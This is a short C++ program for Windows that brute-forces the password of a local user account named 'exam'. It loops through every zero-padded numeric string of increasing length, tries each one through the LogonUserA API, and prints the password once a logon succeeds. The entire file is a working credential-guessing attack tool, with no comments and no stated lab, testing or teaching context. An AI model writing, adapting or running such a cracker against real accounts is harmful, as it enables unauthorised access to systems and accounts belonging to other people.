#include <iostream>
#include <Windows.h>
#include <string>

using namespace std;

int main()
{
    bool a = true;
    string username{"exam"};
    string password;

    for (int j = 1; a; ++j) {
        for (int i = 0; i != pow(10, j); ++i) {
            password = to_string(i);

            if (password.size() != j) {
                int ssize = j - password.size();
                string null(ssize, '0');
                password =  null + to_string(i);
            }

            HANDLE token = nullptr;
            BOOL result = LogonUserA(username.c_str(), ".", password.c_str(), LOGON32_LOGON_NETWORK, LOGON32_PROVIDER_DEFAULT, &token);

            if (result) {
                std::cout << "Access granted.\n";
                CloseHandle(token);
                cout << password << endl;
                a = false;
                break;

            }
            else {
                DWORD error = GetLastError();
                if (error == ERROR_LOGON_FAILURE) {
                }
                else {
                    std::cout << "Login error: " << error << "\n";
                }
            }
        }
    }

    return 0;
}